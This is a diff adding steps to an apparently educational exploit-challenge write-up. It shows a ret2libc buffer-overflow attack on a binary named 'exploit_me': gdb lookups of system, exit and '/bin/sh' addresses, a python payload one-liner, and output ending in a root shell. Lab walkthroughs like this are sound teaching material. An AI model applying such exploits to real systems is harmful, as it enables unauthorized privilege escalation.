@@ -594,11 +594,28 @@ Segmentation fault (core dumped)
 
 Let's use a ret2libc in order to get root access.
 
-1) Get system address 
 
+1) Get system address : print &system
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+ ```
+2) Get exit address :
+```
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+ ```
+3) Get /bin/sh address :
+```
+(gdb) find &system,+99999999,"/bin/sh"
+0xb7f8cc58
+```
+4) Finally, launch exploit :
+```
 ./exploit_me `python -c "print 'A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'"`
-
-
+# whoami
+root
+```
 
 
 
